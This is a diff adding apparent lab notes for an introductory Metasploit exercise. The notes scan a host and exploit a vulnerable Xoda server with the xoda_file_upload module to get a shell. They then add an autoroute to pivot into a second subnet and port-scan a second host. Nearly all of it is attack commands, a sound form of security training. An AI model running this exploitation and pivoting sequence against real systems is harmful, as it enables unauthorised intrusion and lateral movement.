@@ -1,0 +1,52 @@
+# Metasploit (Introduction)
+
+---------------------------------------------------------------
+
+###  Run Nmap scan on the target machine
+
+> - nmap 192.120.121.3
+
+*Web server running on this host*
+> - curl 192.120.121.3
+
+*A vulnerable Xoda server is running on this host*
+
+---------------------------------------------------------------
+
+###  Exploit Xoda vulnerability
+
+> - msfconsole
+> - use exploit/unix/webapp/xoda_file_upload
+> - set RHOSTS 192.120.121.3
+> - set TARGETURI /
+> - exploit
+
+---------------------------------------------------------------
+
+###  We get a linux shell 
+
+> - shell
+> - ip addr
+*This host is connected to two subnets*
+---------------------------------------------------------------
+
+###  Add a route to the second victim on MSF
+
+> - run autoroute -s 192.125.162.3
+
+
+---------------------------------------------------------------
+
+###  Scan the second hosts 
+
+> - use auxiliary/scanner/portscan/tcp
+> - set RHOSTS 192.125.162.3
+> - set verbose true
+> - set ports 1-1000
+> - exploit
+
+
+
+
+
+
